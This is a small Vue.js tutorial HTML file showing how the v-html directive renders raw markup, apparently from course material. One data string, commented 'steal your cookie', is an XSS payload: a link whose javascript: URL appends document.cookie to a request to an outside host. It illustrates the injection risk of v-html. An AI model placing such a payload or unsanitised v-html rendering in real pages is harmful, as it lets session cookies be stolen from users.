<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>你好,{{name}}</div>
        <!-- v-html支持标签解析 -->
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name:'makima',
                str:'<h3>你好啊</h3>',
                /* 偷你cookie */
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>来了宝贝</a>'
            },
        })
    </script>
</body>
</html>
